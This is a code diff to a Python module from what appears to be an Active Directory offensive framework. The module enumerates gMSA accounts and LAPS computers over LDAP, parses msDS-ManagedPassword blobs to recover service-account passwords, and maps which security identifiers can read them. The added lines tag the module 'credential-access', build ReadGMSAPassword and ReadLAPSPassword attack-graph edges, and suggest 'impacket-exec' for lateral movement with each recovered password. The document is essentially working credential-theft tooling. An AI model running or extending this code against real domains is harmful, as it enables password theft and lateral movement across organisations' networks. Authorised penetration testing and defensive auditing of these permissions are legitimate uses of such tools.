@@ -42,12 +42,7 @@ LAPS_ATTRS = [
 
 
 def _parse_managed_password_blob(blob: bytes) -> dict[str, Any] | None:
-    """Parse msDS-ManagedPassword BLOB (MS-ADTS MSDS-MANAGEDPASSWORD_BLOB).
-
-    Layout (v1): Version(2) Reserved(2) Length(4) CurrentPasswordOffset(2)
-    PreviousPasswordOffset(2) QueryPasswordIntervalOffset(2)
-    UnchangedPasswordIntervalOffset(2) ... then UTF-16LE passwords.
-    """
+    """Parse msDS-ManagedPassword BLOB (MS-ADTS MSDS-MANAGEDPASSWORD_BLOB)."""
     if not blob or len(blob) < 16:
         return None
     try:
@@ -58,7 +53,6 @@ def _parse_managed_password_blob(blob: bytes) -> dict[str, Any] | None:
         def _wcs(offset: int) -> str | None:
             if offset == 0 or offset >= len(blob):
                 return None
-            # null-terminated UTF-16LE
             end = offset
             while end + 1 < len(blob) and not (blob[end] == 0 and blob[end + 1] == 0):
                 end += 2
@@ -79,7 +73,7 @@ def _parse_managed_password_blob(blob: bytes) -> dict[str, Any] | None:
     id="gmsa-laps-enum",
     summary="Enumerate gMSAs and LAPS; read secrets with --include-secrets when permitted",
     category="credential-access",
-    tags=("gmsa", "laps", "credentials"),
+    tags=("gmsa", "laps", "credentials", "readgmsapassword"),
 )
 class GmsaLapsEnum:
     def run(
@@ -100,6 +94,7 @@ class GmsaLapsEnum:
 
         gmsas: list[dict[str, Any]] = []
         secrets_found = 0
+        next_actions_hints: list[dict[str, str]] = []
 
         conn.search(base_dn, GMSA_FILTER, search_scope=SUBTREE, attributes=GMSA_ATTRS)
         for entry in conn.entries:
@@ -118,20 +113,30 @@ class GmsaLapsEnum:
                 entry["msDS-GroupMSAMembership"] if entry["msDS-GroupMSAMembership"] else None
             )
             if membership:
+                # Security descriptor blob — surface a truncated signal for operators
                 item["group_msa_membership_raw"] = str(membership.value)[:200]
+                item["group_msa_membership_present"] = True
+            else:
+                item["group_msa_membership_present"] = False
 
-            readable_by: list[str] = []
+            readable_by: list[dict[str, str]] = []
             sd = fetch_sd(conn, dn)
             if sd:
                 try:
                     for ace in parse_interesting_aces(sd):
-                        if ace.right in ("GenericAll", "ReadProperty", "GenericWrite"):
-                            readable_by.append(f"{ace.principal_sid}:{ace.right}")
+                        if ace.right in (
+                            "GenericAll",
+                            "ReadProperty",
+                            "GenericWrite",
+                            "AllExtendedRights",
+                        ):
+                            readable_by.append(
+                                {"sid": ace.principal_sid, "right": ace.right}
+                            )
                 except Exception:  # noqa: BLE001
                     pass
             item["acl_read_signals"] = readable_by[:20]
 
-            # Secret read path
             mp = entry["msDS-ManagedPassword"] if entry["msDS-ManagedPassword"] else None
             if mp and mp.value is not None:
                 item["managed_password_present"] = True
@@ -145,6 +150,18 @@ class GmsaLapsEnum:
                             item["managed_password"] = parsed
                             secrets_found += 1
                             console.print(f"  [red]gMSA SECRET[/red]  {sam}")
+                            next_actions_hints.append(
+                                {
+                                    "capability": "ticket-lifecycle",
+                                    "reason": f"gMSA password recovered for {sam}",
+                                }
+                            )
+                            next_actions_hints.append(
+                                {
+                                    "capability": "impacket-exec",
+                                    "reason": f"Use recovered gMSA {sam} for lateral movement",
+                                }
+                            )
                         else:
                             item["managed_password_blob_len"] = len(raw)
                             item["managed_password_parse"] = "failed"
@@ -155,6 +172,11 @@ class GmsaLapsEnum:
             graph.add_node(node_id, "User", sam=sam, dn=dn, gmsa=True)
             if item.get("managed_password_present"):
                 graph.add_edge(node_id, node_id, "GMSAPasswordReadable")
+            for ace in readable_by:
+                src = f"SID@{ace['sid']}"
+                graph.add_node(src, "Base", sid=ace["sid"])
+                graph.add_edge(src, node_id, "ReadGMSAPassword", right=ace["right"])
+
             gmsas.append(item)
             console.print(
                 f"  gMSA [cyan]{sam}[/cyan]  secret_attr={item['managed_password_present']}  "
@@ -203,7 +225,7 @@ class GmsaLapsEnum:
                 try:
                     for ace in parse_interesting_aces(sd):
                         if ace.right in ("GenericAll", "ReadProperty"):
-                            readable_by.append(f"{ace.principal_sid}:{ace.right}")
+                            readable_by.append({"sid": ace.principal_sid, "right": ace.right})
                 except Exception:  # noqa: BLE001
                     pass
             item["acl_read_signals"] = readable_by[:20]
@@ -220,6 +242,11 @@ class GmsaLapsEnum:
             )
             if legacy or win_laps:
                 graph.add_edge(node_id, node_id, "LAPSReadable")
+            for ace in readable_by:
+                src = f"SID@{ace['sid']}"
+                graph.add_node(src, "Base", sid=ace["sid"])
+                graph.add_edge(src, node_id, "ReadLAPSPassword", right=ace["right"])
+
             laps_computers.append(item)
             console.print(
                 f"  LAPS [cyan]{sam}[/cyan]  legacy={legacy} windows={win_laps} "
@@ -236,10 +263,10 @@ class GmsaLapsEnum:
             "laps_computers": laps_computers,
             "secrets_returned": secrets_found if include_secrets else 0,
             "include_secrets": include_secrets,
+            "suggested_next": next_actions_hints[:10],
         }
 
         out_path = session.path("gmsa-laps-enum.json")
-        # Redaction: if not include_secrets, already no password fields
         out_path.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
         graph.save(session.path("graph.json"))
         session.log(
